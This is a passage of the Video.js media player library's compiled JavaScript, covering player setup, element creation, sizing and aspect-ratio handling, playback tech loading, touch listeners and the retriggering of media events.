    if (_this.controls()) {
      _this.addClass('vjs-controls-enabled');
    } else {
      _this.addClass('vjs-controls-disabled');
    }

    // Set ARIA label and region role depending on player type
    _this.el_.setAttribute('role', 'region');
    if (_this.isAudio()) {
      _this.el_.setAttribute('aria-label', _this.localize('Audio Player'));
    } else {
      _this.el_.setAttribute('aria-label', _this.localize('Video Player'));
    }

    if (_this.isAudio()) {
      _this.addClass('vjs-audio');
    }

    if (_this.flexNotSupported_()) {
      _this.addClass('vjs-no-flex');
    }

    // TODO: Make this smarter. Toggle user state between touching/mousing
    // using events, since devices can have both touch and mouse events.
    // if (browser.TOUCH_ENABLED) {
    //   this.addClass('vjs-touch-enabled');
    // }

    // iOS Safari has broken hover handling
    if (!IS_IOS) {
      _this.addClass('vjs-workinghover');
    }

    // Make player easily findable by ID
    Player.players[_this.id_] = _this;

    // Add a major version class to aid css in plugins
    var majorVersion = version.split('.')[0];

    _this.addClass('vjs-v' + majorVersion);

    // When the player is first initialized, trigger activity so components
    // like the control bar show themselves if needed
    _this.userActive(true);
    _this.reportUserActivity();

    _this.one('play', _this.listenForUserActivity_);
    _this.on('fullscreenchange', _this.handleFullscreenChange_);
    _this.on('stageclick', _this.handleStageClick_);

    _this.changingSrc_ = false;
    _this.playWaitingForReady_ = false;
    _this.playOnLoadstart_ = null;
    return _this;
  }

  /**
   * Destroys the video player and does any necessary cleanup.
   *
   * This is especially helpful if you are dynamically adding and removing videos
   * to/from the DOM.
   *
   * @fires Player#dispose
   */


  Player.prototype.dispose = function dispose() {
    /**
     * Called when the player is being disposed of.
     *
     * @event Player#dispose
     * @type {EventTarget~Event}
     */
    this.trigger('dispose');
    // prevent dispose from being called twice
    this.off('dispose');

    if (this.styleEl_ && this.styleEl_.parentNode) {
      this.styleEl_.parentNode.removeChild(this.styleEl_);
      this.styleEl_ = null;
    }

    // Kill reference to this player
    Player.players[this.id_] = null;

    if (this.tag && this.tag.player) {
      this.tag.player = null;
    }

    if (this.el_ && this.el_.player) {
      this.el_.player = null;
    }

    if (this.tech_) {
      this.tech_.dispose();
      this.isPosterFromTech_ = false;
      this.poster_ = '';
    }

    if (this.playerElIngest_) {
      this.playerElIngest_ = null;
    }

    if (this.tag) {
      this.tag = null;
    }

    clearCacheForPlayer(this);

    // the actual .el_ is removed here
    _Component.prototype.dispose.call(this);
  };

  /**
   * Create the `Player`'s DOM element.
   *
   * @return {Element}
   *         The DOM element that gets created.
   */


  Player.prototype.createEl = function createEl$$1() {
    var tag = this.tag;
    var el = void 0;
    var playerElIngest = this.playerElIngest_ = tag.parentNode && tag.parentNode.hasAttribute && tag.parentNode.hasAttribute('data-vjs-player');
    var divEmbed = this.tag.tagName.toLowerCase() === 'video-js';

    if (playerElIngest) {
      el = this.el_ = tag.parentNode;
    } else if (!divEmbed) {
      el = this.el_ = _Component.prototype.createEl.call(this, 'div');
    }

    // Copy over all the attributes from the tag, including ID and class
    // ID will now reference player box, not the video tag
    var attrs = getAttributes(tag);

    if (divEmbed) {
      el = this.el_ = tag;
      tag = this.tag = document_1.createElement('video');
      while (el.children.length) {
        tag.appendChild(el.firstChild);
      }

      if (!hasClass(el, 'video-js')) {
        addClass(el, 'video-js');
      }

      el.appendChild(tag);

      playerElIngest = this.playerElIngest_ = el;

      // copy over properties from the video-js element
      // ie8 doesn't support Object.keys nor hasOwnProperty
      // on dom elements so we have to specify properties individually
      ['autoplay', 'controls', 'crossOrigin', 'defaultMuted', 'defaultPlaybackRate', 'loop', 'muted', 'playbackRate', 'src', 'volume'].forEach(function (prop) {
        if (typeof el[prop] !== 'undefined') {
          tag[prop] = el[prop];
        }
      });
    }

    // set tabindex to -1 to remove the video element from the focus order
    tag.setAttribute('tabindex', '-1');
    // Workaround for #4583 (JAWS+IE doesn't announce BPB or play button)
    // See https://github.com/FreedomScientific/VFO-standards-support/issues/78
    // Note that we can't detect if JAWS is being used, but this ARIA attribute
    //  doesn't change behavior of IE11 if JAWS is not being used
    if (IE_VERSION) {
      tag.setAttribute('role', 'application');
    }

    // Remove width/height attrs from tag so CSS can make it 100% width/height
    tag.removeAttribute('width');
    tag.removeAttribute('height');

    Object.getOwnPropertyNames(attrs).forEach(function (attr) {
      // workaround so we don't totally break IE7
      // http://stackoverflow.com/questions/3653444/css-styles-not-applied-on-dynamic-elements-in-internet-explorer-7
      if (attr === 'class') {
        el.className += ' ' + attrs[attr];

        if (divEmbed) {
          tag.className += ' ' + attrs[attr];
        }
      } else {
        el.setAttribute(attr, attrs[attr]);

        if (divEmbed) {
          tag.setAttribute(attr, attrs[attr]);
        }
      }
    });

    // Update tag id/class for use as HTML5 playback tech
    // Might think we should do this after embedding in container so .vjs-tech class
    // doesn't flash 100% width/height, but class only applies with .video-js parent
    tag.playerId = tag.id;
    tag.id += '_html5_api';
    tag.className = 'vjs-tech';

    // Make player findable on elements
    tag.player = el.player = this;
    // Default state of video is paused
    this.addClass('vjs-paused');

    // Add a style element in the player that we'll use to set the width/height
    // of the player in a way that's still overrideable by CSS, just like the
    // video element
    if (window_1.VIDEOJS_NO_DYNAMIC_STYLE !== true) {
      this.styleEl_ = createStyleElement('vjs-styles-dimensions');
      var defaultsStyleEl = $('.vjs-styles-defaults');
      var head = $('head');

      head.insertBefore(this.styleEl_, defaultsStyleEl ? defaultsStyleEl.nextSibling : head.firstChild);
    }

    // Pass in the width/height/aspectRatio options which will update the style el
    this.width(this.options_.width);
    this.height(this.options_.height);
    this.fluid(this.options_.fluid);
    this.aspectRatio(this.options_.aspectRatio);

    // Hide any links within the video/audio tag, because IE doesn't hide them completely.
    var links = tag.getElementsByTagName('a');

    for (var i = 0; i < links.length; i++) {
      var linkEl = links.item(i);

      addClass(linkEl, 'vjs-hidden');
      linkEl.setAttribute('hidden', 'hidden');
    }

    // insertElFirst seems to cause the networkState to flicker from 3 to 2, so
    // keep track of the original for later so we can know if the source originally failed
    tag.initNetworkState_ = tag.networkState;

    // Wrap video tag in div (el/box) container
    if (tag.parentNode && !playerElIngest) {
      tag.parentNode.insertBefore(el, tag);
    }

    // insert the tag as the first child of the player element
    // then manually add it to the children array so that this.addChild
    // will work properly for other components
    //
    // Breaks iPhone, fixed in HTML5 setup.
    prependTo(tag, el);
    this.children_.unshift(tag);

    // Set lang attr on player to ensure CSS :lang() in consistent with player
    // if it's been set to something different to the doc
    this.el_.setAttribute('lang', this.language_);

    this.el_ = el;

    return el;
  };

  /**
   * A getter/setter for the `Player`'s width. Returns the player's configured value.
   * To get the current width use `currentWidth()`.
   *
   * @param {number} [value]
   *        The value to set the `Player`'s width to.
   *
   * @return {number}
   *         The current width of the `Player` when getting.
   */


  Player.prototype.width = function width(value) {
    return this.dimension('width', value);
  };

  /**
   * A getter/setter for the `Player`'s height. Returns the player's configured value.
   * To get the current height use `currentheight()`.
   *
   * @param {number} [value]
   *        The value to set the `Player`'s heigth to.
   *
   * @return {number}
   *         The current height of the `Player` when getting.
   */


  Player.prototype.height = function height(value) {
    return this.dimension('height', value);
  };

  /**
   * A getter/setter for the `Player`'s width & height.
   *
   * @param {string} dimension
   *        This string can be:
   *        - 'width'
   *        - 'height'
   *
   * @param {number} [value]
   *        Value for dimension specified in the first argument.
   *
   * @return {number}
   *         The dimension arguments value when getting (width/height).
   */


  Player.prototype.dimension = function dimension(_dimension, value) {
    var privDimension = _dimension + '_';

    if (value === undefined) {
      return this[privDimension] || 0;
    }

    if (value === '') {
      // If an empty string is given, reset the dimension to be automatic
      this[privDimension] = undefined;
      this.updateStyleEl_();
      return;
    }

    var parsedVal = parseFloat(value);

    if (isNaN(parsedVal)) {
      log$1.error('Improper value "' + value + '" supplied for for ' + _dimension);
      return;
    }

    this[privDimension] = parsedVal;
    this.updateStyleEl_();
  };

  /**
   * A getter/setter/toggler for the vjs-fluid `className` on the `Player`.
   *
   * @param {boolean} [bool]
   *        - A value of true adds the class.
   *        - A value of false removes the class.
   *        - No value will toggle the fluid class.
   *
   * @return {boolean|undefined}
   *         - The value of fluid when getting.
   *         - `undefined` when setting.
   */


  Player.prototype.fluid = function fluid(bool) {
    if (bool === undefined) {
      return !!this.fluid_;
    }

    this.fluid_ = !!bool;

    if (bool) {
      this.addClass('vjs-fluid');
    } else {
      this.removeClass('vjs-fluid');
    }

    this.updateStyleEl_();
  };

  /**
   * Get/Set the aspect ratio
   *
   * @param {string} [ratio]
   *        Aspect ratio for player
   *
   * @return {string|undefined}
   *         returns the current aspect ratio when getting
   */

  /**
   * A getter/setter for the `Player`'s aspect ratio.
   *
   * @param {string} [ratio]
   *        The value to set the `Player's aspect ratio to.
   *
   * @return {string|undefined}
   *         - The current aspect ratio of the `Player` when getting.
   *         - undefined when setting
   */


  Player.prototype.aspectRatio = function aspectRatio(ratio) {
    if (ratio === undefined) {
      return this.aspectRatio_;
    }

    // Check for width:height format
    if (!/^\d+\:\d+$/.test(ratio)) {
      throw new Error('Improper value supplied for aspect ratio. The format should be width:height, for example 16:9.');
    }
    this.aspectRatio_ = ratio;

    // We're assuming if you set an aspect ratio you want fluid mode,
    // because in fixed mode you could calculate width and height yourself.
    this.fluid(true);

    this.updateStyleEl_();
  };

  /**
   * Update styles of the `Player` element (height, width and aspect ratio).
   *
   * @private
   * @listens Tech#loadedmetadata
   */


  Player.prototype.updateStyleEl_ = function updateStyleEl_() {
    if (window_1.VIDEOJS_NO_DYNAMIC_STYLE === true) {
      var _width = typeof this.width_ === 'number' ? this.width_ : this.options_.width;
      var _height = typeof this.height_ === 'number' ? this.height_ : this.options_.height;
      var techEl = this.tech_ && this.tech_.el();

      if (techEl) {
        if (_width >= 0) {
          techEl.width = _width;
        }
        if (_height >= 0) {
          techEl.height = _height;
        }
      }

      return;
    }

    var width = void 0;
    var height = void 0;
    var aspectRatio = void 0;
    var idClass = void 0;

    // The aspect ratio is either used directly or to calculate width and height.
    if (this.aspectRatio_ !== undefined && this.aspectRatio_ !== 'auto') {
      // Use any aspectRatio that's been specifically set
      aspectRatio = this.aspectRatio_;
    } else if (this.videoWidth() > 0) {
      // Otherwise try to get the aspect ratio from the video metadata
      aspectRatio = this.videoWidth() + ':' + this.videoHeight();
    } else {
      // Or use a default. The video element's is 2:1, but 16:9 is more common.
      aspectRatio = '16:9';
    }

    // Get the ratio as a decimal we can use to calculate dimensions
    var ratioParts = aspectRatio.split(':');
    var ratioMultiplier = ratioParts[1] / ratioParts[0];

    if (this.width_ !== undefined) {
      // Use any width that's been specifically set
      width = this.width_;
    } else if (this.height_ !== undefined) {
      // Or calulate the width from the aspect ratio if a height has been set
      width = this.height_ / ratioMultiplier;
    } else {
      // Or use the video's metadata, or use the video el's default of 300
      width = this.videoWidth() || 300;
    }

    if (this.height_ !== undefined) {
      // Use any height that's been specifically set
      height = this.height_;
    } else {
      // Otherwise calculate the height from the ratio and the width
      height = width * ratioMultiplier;
    }

    // Ensure the CSS class is valid by starting with an alpha character
    if (/^[^a-zA-Z]/.test(this.id())) {
      idClass = 'dimensions-' + this.id();
    } else {
      idClass = this.id() + '-dimensions';
    }

    // Ensure the right class is still on the player for the style element
    this.addClass(idClass);

    setTextContent(this.styleEl_, '\n      .' + idClass + ' {\n        width: ' + width + 'px;\n        height: ' + height + 'px;\n      }\n\n      .' + idClass + '.vjs-fluid {\n        padding-top: ' + ratioMultiplier * 100 + '%;\n      }\n    ');
  };

  /**
   * Load/Create an instance of playback {@link Tech} including element
   * and API methods. Then append the `Tech` element in `Player` as a child.
   *
   * @param {string} techName
   *        name of the playback technology
   *
   * @param {string} source
   *        video source
   *
   * @private
   */


  Player.prototype.loadTech_ = function loadTech_(techName, source) {
    var _this2 = this;

    // Pause and remove current playback technology
    if (this.tech_) {
      this.unloadTech_();
    }

    var titleTechName = toTitleCase(techName);
    var camelTechName = techName.charAt(0).toLowerCase() + techName.slice(1);

    // get rid of the HTML5 video tag as soon as we are using another tech
    if (titleTechName !== 'Html5' && this.tag) {
      Tech.getTech('Html5').disposeMediaElement(this.tag);
      this.tag.player = null;
      this.tag = null;
    }

    this.techName_ = titleTechName;

    // Turn off API access because we're loading a new tech that might load asynchronously
    this.isReady_ = false;

    // Grab tech-specific options from player options and add source and parent element to use.
    var techOptions = {
      source: source,
      'nativeControlsForTouch': this.options_.nativeControlsForTouch,
      'playerId': this.id(),
      'techId': this.id() + '_' + titleTechName + '_api',
      'autoplay': this.options_.autoplay,
      'playsinline': this.options_.playsinline,
      'preload': this.options_.preload,
      'loop': this.options_.loop,
      'muted': this.options_.muted,
      'poster': this.poster(),
      'language': this.language(),
      'playerElIngest': this.playerElIngest_ || false,
      'vtt.js': this.options_['vtt.js'],
      'canOverridePoster': !!this.options_.techCanOverridePoster,
      'enableSourceset': this.options_.enableSourceset
    };

    ALL.names.forEach(function (name$$1) {
      var props = ALL[name$$1];

      techOptions[props.getterName] = _this2[props.privateName];
    });

    assign(techOptions, this.options_[titleTechName]);
    assign(techOptions, this.options_[camelTechName]);
    assign(techOptions, this.options_[techName.toLowerCase()]);

    if (this.tag) {
      techOptions.tag = this.tag;
    }

    if (source && source.src === this.cache_.src && this.cache_.currentTime > 0) {
      techOptions.startTime = this.cache_.currentTime;
    }

    // Initialize tech instance
    var TechClass = Tech.getTech(techName);

    if (!TechClass) {
      throw new Error('No Tech named \'' + titleTechName + '\' exists! \'' + titleTechName + '\' should be registered using videojs.registerTech()\'');
    }

    this.tech_ = new TechClass(techOptions);

    // player.triggerReady is always async, so don't need this to be async
    this.tech_.ready(bind(this, this.handleTechReady_), true);

    textTrackConverter.jsonToTextTracks(this.textTracksJson_ || [], this.tech_);

    // Listen to all HTML5-defined events and trigger them on the player
    TECH_EVENTS_RETRIGGER.forEach(function (event) {
      _this2.on(_this2.tech_, event, _this2['handleTech' + toTitleCase(event) + '_']);
    });

    Object.keys(TECH_EVENTS_QUEUE).forEach(function (event) {
      _this2.on(_this2.tech_, event, function (eventObj) {
        if (_this2.tech_.playbackRate() === 0 && _this2.tech_.seeking()) {
          _this2.queuedCallbacks_.push({
            callback: _this2['handleTech' + TECH_EVENTS_QUEUE[event] + '_'].bind(_this2),
            event: eventObj
          });
          return;
        }
        _this2['handleTech' + TECH_EVENTS_QUEUE[event] + '_'](eventObj);
      });
    });

    this.on(this.tech_, 'loadstart', this.handleTechLoadStart_);
    this.on(this.tech_, 'sourceset', this.handleTechSourceset_);
    this.on(this.tech_, 'waiting', this.handleTechWaiting_);
    this.on(this.tech_, 'ended', this.handleTechEnded_);
    this.on(this.tech_, 'seeking', this.handleTechSeeking_);
    this.on(this.tech_, 'play', this.handleTechPlay_);
    this.on(this.tech_, 'firstplay', this.handleTechFirstPlay_);
    this.on(this.tech_, 'pause', this.handleTechPause_);
    this.on(this.tech_, 'durationchange', this.handleTechDurationChange_);
    this.on(this.tech_, 'fullscreenchange', this.handleTechFullscreenChange_);
    this.on(this.tech_, 'error', this.handleTechError_);
    this.on(this.tech_, 'loadedmetadata', this.updateStyleEl_);
    this.on(this.tech_, 'posterchange', this.handleTechPosterChange_);
    this.on(this.tech_, 'textdata', this.handleTechTextData_);
    this.on(this.tech_, 'ratechange', this.handleTechRateChange_);

    this.usingNativeControls(this.techGet_('controls'));

    if (this.controls() && !this.usingNativeControls()) {
      this.addTechControlsListeners_();
    }

    // Add the tech element in the DOM if it was not already there
    // Make sure to not insert the original video element if using Html5
    if (this.tech_.el().parentNode !== this.el() && (titleTechName !== 'Html5' || !this.tag)) {
      prependTo(this.tech_.el(), this.el());
    }

    // Get rid of the original video tag reference after the first tech is loaded
    if (this.tag) {
      this.tag.player = null;
      this.tag = null;
    }
  };

  /**
   * Unload and dispose of the current playback {@link Tech}.
   *
   * @private
   */


  Player.prototype.unloadTech_ = function unloadTech_() {
    var _this3 = this;

    // Save the current text tracks so that we can reuse the same text tracks with the next tech
    ALL.names.forEach(function (name$$1) {
      var props = ALL[name$$1];

      _this3[props.privateName] = _this3[props.getterName]();
    });
    this.textTracksJson_ = textTrackConverter.textTracksToJson(this.tech_);

    this.isReady_ = false;

    this.tech_.dispose();

    this.tech_ = false;

    if (this.isPosterFromTech_) {
      this.poster_ = '';
      this.trigger('posterchange');
    }

    this.isPosterFromTech_ = false;
  };

  /**
   * Return a reference to the current {@link Tech}.
   * It will print a warning by default about the danger of using the tech directly
   * but any argument that is passed in will silence the warning.
   *
   * @param {*} [safety]
   *        Anything passed in to silence the warning
   *
   * @return {Tech}
   *         The Tech
   */


  Player.prototype.tech = function tech(safety) {
    if (safety === undefined) {
      log$1.warn(tsml(_templateObject$1));
    }

    return this.tech_;
  };

  /**
   * Set up click and touch listeners for the playback element
   *
   * - On desktops: a click on the video itself will toggle playback
   * - On mobile devices: a click on the video toggles controls
   *   which is done by toggling the user state between active and
   *   inactive
   * - A tap can signal that a user has become active or has become inactive
   *   e.g. a quick tap on an iPhone movie should reveal the controls. Another
   *   quick tap should hide them again (signaling the user is in an inactive
   *   viewing state)
   * - In addition to this, we still want the user to be considered inactive after
   *   a few seconds of inactivity.
   *
   * > Note: the only part of iOS interaction we can't mimic with this setup
   * is a touch and hold on the video element counting as activity in order to
   * keep the controls showing, but that shouldn't be an issue. A touch and hold
   * on any controls will still keep the user active
   *
   * @private
   */


  Player.prototype.addTechControlsListeners_ = function addTechControlsListeners_() {
    // Make sure to remove all the previous listeners in case we are called multiple times.
    this.removeTechControlsListeners_();

    // Some browsers (Chrome & IE) don't trigger a click on a flash swf, but do
    // trigger mousedown/up.
    // http://stackoverflow.com/questions/1444562/javascript-onclick-event-over-flash-object
    // Any touch events are set to block the mousedown event from happening
    this.on(this.tech_, 'mousedown', this.handleTechClick_);

    // If the controls were hidden we don't want that to change without a tap event
    // so we'll check if the controls were already showing before reporting user
    // activity
    this.on(this.tech_, 'touchstart', this.handleTechTouchStart_);
    this.on(this.tech_, 'touchmove', this.handleTechTouchMove_);
    this.on(this.tech_, 'touchend', this.handleTechTouchEnd_);

    // The tap listener needs to come after the touchend listener because the tap
    // listener cancels out any reportedUserActivity when setting userActive(false)
    this.on(this.tech_, 'tap', this.handleTechTap_);
  };

  /**
   * Remove the listeners used for click and tap controls. This is needed for
   * toggling to controls disabled, where a tap/touch should do nothing.
   *
   * @private
   */


  Player.prototype.removeTechControlsListeners_ = function removeTechControlsListeners_() {
    // We don't want to just use `this.off()` because there might be other needed
    // listeners added by techs that extend this.
    this.off(this.tech_, 'tap', this.handleTechTap_);
    this.off(this.tech_, 'touchstart', this.handleTechTouchStart_);
    this.off(this.tech_, 'touchmove', this.handleTechTouchMove_);
    this.off(this.tech_, 'touchend', this.handleTechTouchEnd_);
    this.off(this.tech_, 'mousedown', this.handleTechClick_);
  };

  /**
   * Player waits for the tech to be ready
   *
   * @private
   */


  Player.prototype.handleTechReady_ = function handleTechReady_() {
    this.triggerReady();

    // Keep the same volume as before
    if (this.cache_.volume) {
      this.techCall_('setVolume', this.cache_.volume);
    }

    // Look if the tech found a higher resolution poster while loading
    this.handleTechPosterChange_();

    // Update the duration if available
    this.handleTechDurationChange_();

    // Chrome and Safari both have issues with autoplay.
    // In Safari (5.1.1), when we move the video element into the container div, autoplay doesn't work.
    // In Chrome (15), if you have autoplay + a poster + no controls, the video gets hidden (but audio plays)
    // This fixes both issues. Need to wait for API, so it updates displays correctly
    if ((this.src() || this.currentSrc()) && this.tag && this.options_.autoplay && this.paused()) {
      try {
        // Chrome Fix. Fixed in Chrome v16.
        delete this.tag.poster;
      } catch (e) {
        log$1('deleting tag.poster throws in some browsers', e);
      }
    }
  };

  /**
   * Retrigger the `loadstart` event that was triggered by the {@link Tech}. This
   * function will also trigger {@link Player#firstplay} if it is the first loadstart
   * for a video.
   *
   * @fires Player#loadstart
   * @fires Player#firstplay
   * @listens Tech#loadstart
   * @private
   */


  Player.prototype.handleTechLoadStart_ = function handleTechLoadStart_() {
    // TODO: Update to use `emptied` event instead. See #1277.

    this.removeClass('vjs-ended');
    this.removeClass('vjs-seeking');

    // reset the error state
    this.error(null);

    // If it's already playing we want to trigger a firstplay event now.
    // The firstplay event relies on both the play and loadstart events
    // which can happen in any order for a new source
    if (!this.paused()) {
      /**
       * Fired when the user agent begins looking for media data
       *
       * @event Player#loadstart
       * @type {EventTarget~Event}
       */
      this.trigger('loadstart');
      this.trigger('firstplay');
    } else {
      // reset the hasStarted state
      this.hasStarted(false);
      this.trigger('loadstart');
    }
  };

  /**
   * Update the internal source caches so that we return the correct source from
   * `src()`, `currentSource()`, and `currentSources()`.
   *
   * > Note: `currentSources` will not be updated if the source that is passed in exists
   *         in the current `currentSources` cache.
   *
   *
   * @param {Tech~SourceObject} srcObj
   *        A string or object source to update our caches to.
   */


  Player.prototype.updateSourceCaches_ = function updateSourceCaches_() {
    var srcObj = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : '';


    var src = srcObj;
    var type = '';

    if (typeof src !== 'string') {
      src = srcObj.src;
      type = srcObj.type;
    }
    // make sure all the caches are set to default values
    // to prevent null checking
    this.cache_.source = this.cache_.source || {};
    this.cache_.sources = this.cache_.sources || [];

    // try to get the type of the src that was passed in
    if (src && !type) {
      type = findMimetype(this, src);
    }

    // update `currentSource` cache always
    this.cache_.source = mergeOptions({}, srcObj, { src: src, type: type });

    var matchingSources = this.cache_.sources.filter(function (s) {
      return s.src && s.src === src;
    });
    var sourceElSources = [];
    var sourceEls = this.$$('source');
    var matchingSourceEls = [];

    for (var i = 0; i < sourceEls.length; i++) {
      var sourceObj = getAttributes(sourceEls[i]);

      sourceElSources.push(sourceObj);

      if (sourceObj.src && sourceObj.src === src) {
        matchingSourceEls.push(sourceObj.src);
      }
    }

    // if we have matching source els but not matching sources
    // the current source cache is not up to date
    if (matchingSourceEls.length && !matchingSources.length) {
      this.cache_.sources = sourceElSources;
      // if we don't have matching source or source els set the
      // sources cache to the `currentSource` cache
    } else if (!matchingSources.length) {
      this.cache_.sources = [this.cache_.source];
    }

    // update the tech `src` cache
    this.cache_.src = src;
  };

  /**
   * *EXPERIMENTAL* Fired when the source is set or changed on the {@link Tech}
   * causing the media element to reload.
   *
   * It will fire for the initial source and each subsequent source.
   * This event is a custom event from Video.js and is triggered by the {@link Tech}.
   *
   * The event object for this event contains a `src` property that will contain the source
   * that was available when the event was triggered. This is generally only necessary if Video.js
   * is switching techs while the source was being changed.
   *
   * It is also fired when `load` is called on the player (or media element)
   * because the {@link https://html.spec.whatwg.org/multipage/media.html#dom-media-load|specification for `load`}
   * says that the resource selection algorithm needs to be aborted and restarted.
   * In this case, it is very likely that the `src` property will be set to the
   * empty string `""` to indicate we do not know what the source will be but
   * that it is changing.
   *
   * *This event is currently still experimental and may change in minor releases.*
   * __To use this, pass `enableSourceset` option to the player.__
   *
   * @event Player#sourceset
   * @type {EventTarget~Event}
   * @prop {string} src
   *                The source url available when the `sourceset` was triggered.
   *                It will be an empty string if we cannot know what the source is
   *                but know that the source will change.
   */
  /**
   * Retrigger the `sourceset` event that was triggered by the {@link Tech}.
   *
   * @fires Player#sourceset
   * @listens Tech#sourceset
   * @private
   */


  Player.prototype.handleTechSourceset_ = function handleTechSourceset_(event) {
    var _this4 = this;

    // only update the source cache when the source
    // was not updated using the player api
    if (!this.changingSrc_) {
      // update the source to the intial source right away
      // in some cases this will be empty string
      this.updateSourceCaches_(event.src);

      // if the `sourceset` `src` was an empty string
      // wait for a `loadstart` to update the cache to `currentSrc`.
      // If a sourceset happens before a `loadstart`, we reset the state
      // as this function will be called again.
      if (!event.src) {
        var updateCache = function updateCache(e) {
          if (e.type !== 'sourceset') {
            _this4.updateSourceCaches_(_this4.techGet_('currentSrc'));
          }

          _this4.tech_.off(['sourceset', 'loadstart'], updateCache);
        };

        this.tech_.one(['sourceset', 'loadstart'], updateCache);
      }
    }

    this.trigger({
      src: event.src,
      type: 'sourceset'
    });
  };

  /**
   * Add/remove the vjs-has-started class
   *
   * @fires Player#firstplay
   *
   * @param {boolean} request
   *        - true: adds the class
   *        - false: remove the class
   *
   * @return {boolean}
   *         the boolean value of hasStarted_
   */


  Player.prototype.hasStarted = function hasStarted(request) {
    if (request === undefined) {
      // act as getter, if we have no request to change
      return this.hasStarted_;
    }

    if (request === this.hasStarted_) {
      return;
    }

    this.hasStarted_ = request;

    if (this.hasStarted_) {
      this.addClass('vjs-has-started');
      this.trigger('firstplay');
    } else {
      this.removeClass('vjs-has-started');
    }
  };

  /**
   * Fired whenever the media begins or resumes playback
   *
   * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#dom-media-play}
   * @fires Player#play
   * @listens Tech#play
   * @private
   */


  Player.prototype.handleTechPlay_ = function handleTechPlay_() {
    this.removeClass('vjs-ended');
    this.removeClass('vjs-paused');
    this.addClass('vjs-playing');

    // hide the poster when the user hits play
    this.hasStarted(true);
    /**
     * Triggered whenever an {@link Tech#play} event happens. Indicates that
     * playback has started or resumed.
     *
     * @event Player#play
     * @type {EventTarget~Event}
     */
    this.trigger('play');
  };

  /**
   * Retrigger the `ratechange` event that was triggered by the {@link Tech}.
   *
   * If there were any events queued while the playback rate was zero, fire
   * those events now.
   *
   * @private
   * @method Player#handleTechRateChange_
   * @fires Player#ratechange
   * @listens Tech#ratechange
   */


  Player.prototype.handleTechRateChange_ = function handleTechRateChange_() {
    if (this.tech_.playbackRate() > 0 && this.cache_.lastPlaybackRate === 0) {
      this.queuedCallbacks_.forEach(function (queued) {
        return queued.callback(queued.event);
      });
      this.queuedCallbacks_ = [];
    }
    this.cache_.lastPlaybackRate = this.tech_.playbackRate();
    /**
     * Fires when the playing speed of the audio/video is changed
     *
     * @event Player#ratechange
     * @type {event}
     */
    this.trigger('ratechange');
  };

  /**
   * Retrigger the `waiting` event that was triggered by the {@link Tech}.
   *
   * @fires Player#waiting
   * @listens Tech#waiting
   * @private
   */


  Player.prototype.handleTechWaiting_ = function handleTechWaiting_() {
    var _this5 = this;

    this.addClass('vjs-waiting');
    /**
     * A readyState change on the DOM element has caused playback to stop.
     *
     * @event Player#waiting
     * @type {EventTarget~Event}
     */
    this.trigger('waiting');
    this.one('timeupdate', function () {
      return _this5.removeClass('vjs-waiting');
    });
  };

  /**
   * Retrigger the `canplay` event that was triggered by the {@link Tech}.
   * > Note: This is not consistent between browsers. See #1351
   *
   * @fires Player#canplay
   * @listens Tech#canplay
   * @private
   */


  Player.prototype.handleTechCanPlay_ = function handleTechCanPlay_() {
    this.removeClass('vjs-waiting');
    /**
     * The media has a readyState of HAVE_FUTURE_DATA or greater.
     *
     * @event Player#canplay
     * @type {EventTarget~Event}
     */
    this.trigger('canplay');
  };

  /**
   * Retrigger the `canplaythrough` event that was triggered by the {@link Tech}.
   *
   * @fires Player#canplaythrough
   * @listens Tech#canplaythrough
   * @private
   */


  Player.prototype.handleTechCanPlayThrough_ = function handleTechCanPlayThrough_() {
    this.removeClass('vjs-waiting');
    /**
     * The media has a readyState of HAVE_ENOUGH_DATA or greater. This means that the
     * entire media file can be played without buffering.
     *
     * @event Player#canplaythrough
     * @type {EventTarget~Event}
     */
    this.trigger('canplaythrough');
  };

  /**
   * Retrigger the `playing` event that was triggered by the {@link Tech}.
   *
   * @fires Player#playing
   * @listens Tech#playing
   * @private
   */


  Player.prototype.handleTechPlaying_ = function handleTechPlaying_() {
    this.removeClass('vjs-waiting');
    /**
     * The media is no longer blocked from playback, and has started playing.
     *
     * @event Player#playing
     * @type {EventTarget~Event}
     */
    this.trigger('playing');
  };

  /**
   * Retrigger the `seeking` event that was triggered by the {@link Tech}.
   *
   * @fires Player#seeking
   * @listens Tech#seeking
   * @private
   */


  Player.prototype.handleTechSeeking_ = function handleTechSeeking_() {
    this.addClass('vjs-seeking');
    /**
     * Fired whenever the player is jumping to a new time
     *
     * @event Player#seeking
     * @type {EventTarget~Event}
     */
    this.trigger('seeking');
  };

  /**
   * Retrigger the `seeked` event that was triggered by the {@link Tech}.
   *
   * @fires Player#seeked
   * @listens Tech#seeked
   * @private
   */


  Player.prototype.handleTechSeeked_ = function handleTechSeeked_() {
    this.removeClass('vjs-seeking');
    /**
     * Fired when the player has finished jumping to a new time
     *
     * @event Player#seeked
     * @type {EventTarget~Event}
     */
    this.trigger('seeked');
  };

  /**
   * Retrigger the `firstplay` event that was triggered by the {@link Tech}.
   *
   * @fires Player#firstplay
   * @listens Tech#firstplay
   * @deprecated As of 6.0 firstplay event is deprecated.
   * @deprecated As of 6.0 passing the `starttime` option to the player and the firstplay event are deprecated.
   * @private
   */


  Player.prototype.handleTechFirstPlay_ = function handleTechFirstPlay_() {
    // If the first starttime attribute is specified
    // then we will start at the given offset in seconds
    if (this.options_.starttime) {
      log$1.warn('Passing the `starttime` option to the player will be deprecated in 6.0');
      this.currentTime(this.options_.starttime);
    }

    this.addClass('vjs-has-started');
    /**
     * Fired the first time a video is played. Not part of the HLS spec, and this is
     * probably not the best implementation yet, so use sparingly. If you don't have a
     * reason to prevent playback, use `myPlayer.one('play');` instead.
     *
     * @event Player#firstplay
     * @deprecated As of 6.0 firstplay event is deprecated.
     * @type {EventTarget~Event}
     */
    this.trigger('firstplay');
  };

  /**
   * Retrigger the `pause` event that was triggered by the {@link Tech}.
   *
   * @fires Player#pause
   * @listens Tech#pause
   * @private
   */


  Player.prototype.handleTechPause_ = function handleTechPause_() {
    this.removeClass('vjs-playing');
    this.addClass('vjs-paused');
    /**
     * Fired whenever the media has been paused
     *
     * @event Player#pause
     * @type {EventTarget~Event}
     */
    this.trigger('pause');
  };

  /**
   * Retrigger the `ended` event that was triggered by the {@link Tech}.
   *
   * @fires Player#ended
   * @listens Tech#ended
   * @private
   */


  Player.prototype.handleTechEnded_ = function handleTechEnded_() {
    this.addClass('vjs-ended');
    if (this.options_.loop) {
      this.currentTime(0);
      this.play();
    } else if (!this.paused()) {
      this.pause();
    }

    /**
     * Fired when the end of the media resource is reached (currentTime == duration)
     *
